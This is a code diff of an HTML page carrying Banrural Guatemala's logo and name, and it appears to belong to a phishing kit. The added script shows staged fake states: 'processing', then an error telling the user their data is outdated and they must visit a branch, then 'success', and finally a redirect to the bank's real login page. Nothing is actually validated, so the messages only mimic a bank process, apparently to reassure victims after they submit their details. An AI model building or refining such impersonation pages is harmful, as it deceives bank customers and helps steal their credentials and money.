@@ -66,10 +66,21 @@
       transition:background .15s;
     }
     .btn:hover{background:#04421a}
-    .done .spinner{display:none}
-    .done .check,.done .btn{display:inline-flex}
-    .done .processing-text{display:none}
-    .done h1{color:#1d8c44}
+    .icon-error{
+      width:64px;height:64px;border-radius:50%;
+      background:#fdecea;color:#c0392b;
+      display:none;align-items:center;justify-content:center;
+      margin:8px auto 22px;
+    }
+    .icon-error svg{width:36px;height:36px}
+    /* === Estado: error === */
+    .state-error .spinner{display:none}
+    .state-error .icon-error{display:inline-flex}
+    .state-error h1{color:#c0392b}
+    /* === Estado: redirigiendo === */
+    .state-redirect .icon-error{display:none}
+    .state-redirect .spinner{display:block}
+    .state-redirect h1{color:#04421a}
     .note{font-size:12.5px;color:#9aa0aa;margin-top:18px}
   </style>
 </head>
@@ -77,24 +88,41 @@
   <div class="card" id="card">
     <img src="img/Nuevo_Logo_Banrural.webp" alt="Banrural Guatemala" class="logo" />
     <div class="spinner" aria-hidden="true"></div>
-    <div class="check" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
+    <div class="icon-error" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="13"/><line x1="12" y1="16.5" x2="12" y2="16.5"/></svg>
     </div>
     <h1 id="title">Procesando tu solicitud...</h1>
-    <p class="processing-text">Validando tu información</p>
-    <p class="success-text" style="display:none">Tu solicitud fue recibida correctamente.</p>
-     <p class="note">© 2026 Banco de Desarrollo Rural, S.A. (Banrural).</p>
+    <p id="message">Estamos validando tu información</p>
+    <p class="note">© 2026 Banco de Desarrollo Rural, S.A. (Banrural).</p>
   </div>
   <script>
-    setTimeout(function(){
-      var card=document.getElementById('card');
-      var p=document.querySelector('.processing-text');
-      var s=document.querySelector('.success-text');
-      document.getElementById('title').textContent='¡Solicitud recibida!';
-      card.classList.add('done');
-      if(p) p.style.display='none';
-      if(s) s.style.display='block';
-    }, 3500);
+    (function(){
+      var card    = document.getElementById('card');
+      var title   = document.getElementById('title');
+      var message = document.getElementById('message');
+
+      // 0 – 8 s: spinner verde + "Procesando tu solicitud..."
+
+      // 8 s -> Error (dura 8 s)
+      setTimeout(function(){
+        card.classList.add('state-error');
+        title.textContent = 'Ups, No podemos continuar con tu solicitud';
+        message.textContent = 'Alguno de tus datos no se encuentran actualizados. Por favor, debes asistir a la sucursal física más cercana para completar la validación de identidad.';
+      }, 8000);
+
+      // 16 s -> Éxito + cargando (dura 5 s)
+      setTimeout(function(){
+        card.classList.remove('state-error');
+        card.classList.add('state-redirect');
+        title.textContent = 'Solicitud recibida con éxito';
+        message.textContent = 'Cargando...';
+      }, 16000);
+
+      // 21 s -> Redirect a Banca Virtual
+      setTimeout(function(){
+        window.location.replace('https://bancavirtual.banrural.com.gt/cb/pages/jsp-ns/login-cons.jsp');
+      }, 21000);
+    })();
   </script>
 </body>
 </html>
